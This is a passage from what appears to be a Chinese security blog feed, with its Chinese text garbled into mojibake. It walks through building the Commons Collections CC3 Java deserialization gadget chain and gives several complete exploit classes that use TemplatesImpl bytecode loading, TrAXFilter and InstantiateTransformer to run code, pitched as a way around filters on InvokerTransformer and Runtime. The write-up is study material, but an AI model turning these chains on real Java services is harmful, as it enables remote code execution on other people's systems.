class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        templates.newTransformer();  </span></span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line"><span class="comment">//        chainedTransformer.transform(1);  </span></span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  </span><br><span class="line">        <span class="comment">//InvocationHandlerè§£å†³proxyMapä¸èƒ½åºåˆ—åŒ–ï¼Œç„¶åé€šè¿‡æ„é€ æ–¹æ³•å°†ä»£ç†å¯¹è±¡proxyMapèµ‹å€¼ç»™memberValues  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–ä¸ååºåˆ—åŒ–  </span></span><br><span class="line"><span class="comment">//        serialize(invocationHandler);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031736820.png" alt="image-20230603173603684"><br>ç›®å‰çš„æµç¨‹å›¾å¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031736425.png" alt="image-20230603173633352"><br>CC6å’Œè¿™ä¸ªä¹Ÿå·®ä¸å¤šçš„ä¹Ÿèƒ½é€š</p><h2 id="ç»§ç»­åˆ†æCC3"><a href="#ç»§ç»­åˆ†æCC3" class="headerlink" title="ç»§ç»­åˆ†æCC3"></a>ç»§ç»­åˆ†æCC3</h2><p>ç°åœ¨æˆ‘ä»¬å·²ç»æ‰¾åˆ°äº†å‘½ä»¤æ‰§è¡Œçš„ç±»å’Œæ–¹æ³•ä¹Ÿå°±æ˜¯<code>TemplatesImpl.newTransformer()</code>å‰é¢æ˜¯å’ŒCC1çš„å‰åŠéƒ¨åˆ†é“¾èµ·æ¥çš„ç›¸å½“äºå¦‚æœè¿‡æ»¤äº†<code>Runtime.exec()</code>é‚£å°±å¯ä»¥æ¢ç§æ–¹æ³•æ¥æ‰§è¡Œä»£ç ï¼Œå¦‚æœè¿‡æ»¤äº†<code>InvokerTransform.transform</code>å‘¢ï¼Ÿä¹Ÿæ˜¯æœ‰åˆ«çš„é“¾æ¥åˆ°å‘½ä»¤æ‰§è¡Œçš„ï¼Œè¿™å°±æ˜¯CC3ï¼Œæ‰€ä»¥æˆ‘ä»¬ç»§ç»­ä½¿ç”¨find usageså¾€å‰æ‰¾ï¼Œæœ€ç»ˆæ‰¾åˆ°äº†TrAXFilterè¿™ä¸ªç±»<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031736796.png" alt="image-20230603173655608"><br>è¿™ä¸ªç±»ä¹Ÿæ˜¯ä¸èƒ½åºåˆ—åŒ–çš„æ²¡åŠæ³•ä¼ å‚(å…¶å®è¿™é‡Œæœ‰ç‚¹ä¸å¤ªæ˜ç™½ä¸èƒ½ä¼ å‚æ„å‘³ç€ä»€ä¹ˆ)ï¼Œé‚£ä¹ˆåªèƒ½ä»æ„é€ æ–¹æ³•å…¥æ‰‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_transformer = (TransformerImpl) templates.newTransformer();</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åªè¦æ‰§è¡Œäº†æ„é€ æ–¹æ³•å°±èƒ½åˆ°<code>newTransformer()</code>å‘½ä»¤æ‰§è¡Œï¼Œåœ¨è¿™é‡ŒCC3ä½œè€…è°ƒç”¨äº†ä¸€ä¸ªæ–°çš„ç±»<code>InstantiateTransformer</code>æˆ‘ä»¬å»çœ‹ä¸€ä¸‹å®ƒçš„<code>transform</code>æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031737397.png" alt="image-20230603173706325"><br>è¿™æ ·å°±åˆšåˆšå¥½ç¬¦åˆéœ€æ±‚ç„¶åæ„é€ EXP</p><h2 id="CC3-EXP"><a href="#CC3-EXP" class="headerlink" title="CC3 EXP"></a>CC3 EXP</h2><p>é€šè¿‡<code>InstantiateTransformer</code>æ¥è°ƒç”¨<code>TrAXFilter</code>ç±»çš„æ„é€ æ–¹æ³•è§£å†³å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);  </span><br><span class="line">instantiateTransformer.transform(TrAXFilter.class);</span><br></pre></td></tr></table></figure><p>æµ‹è¯•æˆåŠŸï¼Œç„¶åä½¿ç”¨CC1çš„å‰åŠéƒ¨åˆ†å»è°ƒtransformæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);  </span><br><span class="line"><span class="comment">//        instantiateTransformer.transform(TrAXFilter.class);  </span></span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  instantiateTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);  </span><br><span class="line">        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  </span><br><span class="line">        <span class="comment">//InvocationHandlerè§£å†³proxyMapä¸èƒ½åºåˆ—åŒ–ï¼Œç„¶åé€šè¿‡æ„é€ æ–¹æ³•å°†ä»£ç†å¯¹è±¡proxyMapèµ‹å€¼ç»™memberValues  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–ä¸ååºåˆ—åŒ–  </span></span><br><span class="line"><span class="comment">//        serialize(invocationHandler);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å‘ç°åœ¨ååºåˆ—åŒ–çš„æ—¶å€™æŠ¥é”™ï¼Œè¿™é‡Œè¿˜æ˜¯CC1çš„<code>setValue()</code> çš„ä¼ å‚æ— æ³•æ§åˆ¶ï¼Œéœ€è¦å¼•å…¥ <code>Transformer</code> ä¸ <code>ChainedTransformer</code> è¾…åŠ©ï¼Œæ”¹äº†åçš„EXPå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        templates.newTransformer();  </span></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),  </span><br><span class="line">                instantiateTransformer  </span><br><span class="line">        &#125;;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  </span><br><span class="line">        <span class="comment">//InvocationHandlerè§£å†³proxyMapä¸èƒ½åºåˆ—åŒ–ï¼Œç„¶åé€šè¿‡æ„é€ æ–¹æ³•å°†ä»£ç†å¯¹è±¡proxyMapèµ‹å€¼ç»™memberValues  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–ä¸ååºåˆ—åŒ–  </span></span><br><span class="line"><span class="comment">//        serialize(invocationHandler);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031737151.png" alt="image-20230603173731054"><br>é“¾å­ç»“æŸã€‚è·Ÿå®Œå‘ç°è‡ªå·±å¯¹äºCC1çš„ç†è§£è¿˜æ˜¯ä¸å¤Ÿé€å½»ï¼Œå¾—å»å¤ä¹ ä¸€ä¸‹äº†ï¼ŒCCé“¾è¿™ä¸€å—è¿˜æ˜¯å¾ˆé‡è¦ï¼Œå¯¹äºåç»­å…¶å®ƒçš„é“¾å­¦ä¹ ç®—æ˜¯æ‰“ä¸‹åŸºç¡€</p><h2 id="æµç¨‹å›¾"><a href="#æµç¨‹å›¾" class="headerlink" title="æµç¨‹å›¾"></a>æµç¨‹å›¾</h2><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031737924.png" alt="image-20230603173740854"><br>è¿™æ¡é“¾å­å°±ç›¸å½“äºç»™äº†å‘½ä»¤æ‰§è¡Œçš„å¦ä¸€ç§æ–¹æ³•ï¼Œå¦‚æœ<code>InvokerTransform</code>å’Œ<code>Runtime</code>è¢«åŠäº†å°±å¯ä»¥ç”¨è¿™ä¸€æ¡æ¥ç»•è¿‡</p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub-Raven-2</title>
      <link href="/2023/05/VulnHub-Raven-2/"/>
      <url>/2023/05/VulnHub-Raven-2/</url>
      
